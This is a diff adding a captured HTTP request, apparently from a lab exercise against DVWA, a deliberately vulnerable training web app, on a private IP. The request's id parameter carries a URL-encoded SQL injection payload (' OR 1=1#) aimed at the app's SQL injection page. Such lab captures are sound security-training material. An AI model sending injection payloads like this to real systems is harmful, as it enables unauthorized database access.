@@ -1,0 +1,11 @@
+GET /dvwa/vulnerabilities/sqli/?id=%27+OR+1%3D1%23&Submit=Submit HTTP/1.1
+Host: 192.168.182.138
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://192.168.182.138/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
+Cookie: security=low; PHPSESSID=a6092efdcb1cc186b3f7645bab449908
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
